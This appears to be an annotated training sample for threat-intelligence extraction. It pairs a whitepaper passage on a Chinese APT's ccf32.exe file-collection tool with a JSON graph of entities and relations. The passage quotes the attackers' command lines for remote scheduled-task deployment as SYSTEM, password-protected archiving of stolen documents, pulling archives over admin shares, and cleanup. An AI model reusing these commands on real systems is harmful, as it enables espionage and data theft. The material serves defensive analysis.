@@ -1,0 +1,101 @@
+
+
+
+Sentence : Ccf32
+The ccf32.exe binary ( 362b1114f32b980443957079bac6d01e ) is a command line tool used for data collection.
+Although this tool embeds more options the attackers could use, we have seen only one intensively used, the “-PC”
+option:
+```
+“ccf32.exe -PC all 123456 doc,docx,ppt,pptx,xls,xlsx,pdf 1903220000 1904221000”.
+```
+The “-PC” option accepts six parameters, the flag itself followed by:
+ the target folder for listing
+ the archive password (the archive will contain the collected files)
+ file extensions which attackers are interested in
+ two timestamps whose meaning will be explained below.
+In the case of the previous option, the ccf32 initiates a file listing of all drives if the “all” string is specified, or it lists the
+given as parameter folder. Throughout the listing, the LastWriteTime attribute of each file is transformed into an integer
+using _wtoi and a string obtained as follow:
+Fig. 5 – LastWriteTime to string transformation
+If the resulted integer is contained in the range given by the two timestamps from the command line (which respect
+the same format as the resulted integer), this means that the correspondent file passes the “filter”. All the file paths
+discovered during the listing process are written into a text file called “ temp ” (located in the same folder as ccf32 ). The
+“ temp ” file is parsed to obtain the list of files that have the targeted extensions (those from the command line).
+The ccf32 creates a hidden directory in the current location, naming it after the current local time by using the year,
+month and day (eg. “2019.01.29” -> “20190129”). In that folder, ccf32 temporarily stores the files that it intends to
+collect.
+After that, all files are copied to the temporary hidden folder, ccf32 drops in the current directory a 7zr.exe executable
+which is contained in the ccf32 binary as a buffer XOR-ed with “0x41” byte. The 7zr.exe is used for adding the collected
+files to an archive called “path.7z”, and is being executed using cmd.exe:
+“C:\Windows\system32\cmd.exe/c c:\users\public\7zr.exe a -bso0 -bse2 -bsp2 -p <password_
+from_comamnd_line> c:\users\public\path.7z c:\users\public\20190423\ ”
+If the compression is successful, then the ccf32 starts the cleanup process by deleting the “ temp ” file and the hidden
+folder.
+10
+Bitdefender DracoTeam • WHITEPAPER
+Dissecting a Chinese APT Targeting South Eastern Asian Government Institutions
+The ccf32.exe life cycle in this attack can be described as follows:
+Phase commands
+deployment \\C$\Users\Public\.bat  C:\Users\Public\<bat_
+name>.bat
+\\C$\Users\Public\ccf32.exe  C:\Users\Public\ccf32.exe
+schtasks /create /s  /u “” /p “” /ru “SYSTEM” /
+tn one /sc DAILY /tr “c:\users\public\ \.bat “ /F
+collection xcopy \\c$\users\public\path.7z c:\users\public\bin\<target_
+host>.7z /H /Y
+cleanup cmd.exe /c del \\c$\users\public\path.7z /A:H
+cmd.exe /c schtasks /delete /s  /u  /p  /tn one /f
+cmd.exe /c del \\c$\users\public\.bat && del \\c$\users\public\ccf32.exe
+Although we have seen only the “ -PC ” option used, the ccf32.exe has more capabilities, like uploading the results to an
+ftp server specifying the user, password and the server address to command line.
+There is also a x64 version of this tool, named ccf64.exe (50c0f86e28268d07c1815552962a91ad).
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "ccf32.exe", "type": "EXEF"},
+        {"id": 2, "description": "362b1114f32b980443957079bac6d01e", "type": "IOCS"},
+        {"id": 3, "description": "all drives", "type": "TAMP"},
+        {"id": 4, "description": "123456", "type": "TAMP"},
+        {"id": 5, "description": "doc, docx, ppt, pptx, xls, xlsx, pdf", "type": "TAMP"},
+        {"id": 6, "description": "1903220000", "type": "TAMP"},
+        {"id": 7, "description": "1904221000", "type": "TAMP"},
+        {"id": 8, "description": "temp", "type": "DOCF"},
+        {"id": 9, "description": "hidden directory", "type": "TAMP"},
+        {"id": 10, "description": "2019.01.29 -> 20190129", "type": "TAMP"},
+        {"id": 11, "description": "7zr.exe", "type": "EXEF"},
+        {"id": 12, "description": "path.7z", "type": "DOCF"},
+        {"id": 13, "description": "C:\\Windows\\system32\\cmd.exe", "type": "EXEF"},
+        {"id": 14, "description": "\\C$\\Users\\Public\\.bat", "type": "DOCF"},
+        {"id": 15, "description": "C:\\Users\\Public\\<bat_name>.bat", "type": "DOCF"},
+        {"id": 16, "description": "\\C$\\Users\\Public\\ccf32.exe", "type": "EXEF"},
+        {"id": 17, "description": "schtasks /create /s ...", "type": "TAMP"},
+        {"id": 18, "description": "xcopy \\c$\\users\\public\\path.7z c:\\users\\public\\bin\\<target_host>.7z /H /Y", "type": "TAMP"},
+        {"id": 19, "description": "cmd.exe /c del \\c$\\users\\public\\path.7z /A:H", "type": "TAMP"},
+        {"id": 20, "description": "schtasks /delete /s ...", "type": "TAMP"},
+        {"id": 21, "description": "cmd.exe /c del \\c$\\users\\public\\.bat && del \\c$\\users\\public\\ccf32.exe", "type": "TAMP"},
+        {"id": 22, "description": "ftp server", "type": "CCSH"},
+        {"id": 23, "description": "user, password and server address", "type": "TAMP"},
+        {"id": 24, "description": "ccf64.exe", "type": "EXEF"},
+        {"id": 25, "description": "50c0f86e28268d07c1815552962a91ad", "type": "IOCS"}
+    ],
+    "edges": [
+        {"source": 1, "target": 3, "rel_name": "lists"},
+        {"source": 1, "target": 4, "rel_name": "uses password for archive"},
+        {"source": 1, "target": 5, "rel_name": "targets file extensions"},
+        {"source": 1, "target": 6, "rel_name": "filters by timestamp"},
+        {"source": 1, "target": 7, "rel_name": "filters by timestamp"},
+        {"source": 1, "target": 8, "rel_name": "writes to file"},
+        {"source": 1, "target": 9, "rel_name": "creates hidden directory"},
+        {"source": 1, "target": 10, "rel_name": "names directory by date"},
+        {"source": 1, "target": 11, "rel_name": "drops executable"},
+        {"source": 1, "target": 12, "rel_name": "creates archive"},
+        {"source": 13, "target": 14, "rel_name": "executes bat file"},
+        {"source": 16, "target": 15, "rel_name": "writes to location"},
+        {"source": 17, "target": 1, "rel_name": "schedules task for execution of"},
+        {"source": 18, "target": 12, "rel_name": "copies archive to target location"},
+        {"source": 19, "target": 12, "rel_name": "deletes archive after use"},
+        {"source": 20, "target": 17, "rel_name": "deletes scheduled task"},
+        {"source": 21, "target": 14, "rel_name": "cleans up bat file"},
+        {"source": 21, "target": 16, "rel_name": "cleans up executable"}
+    ]
+}
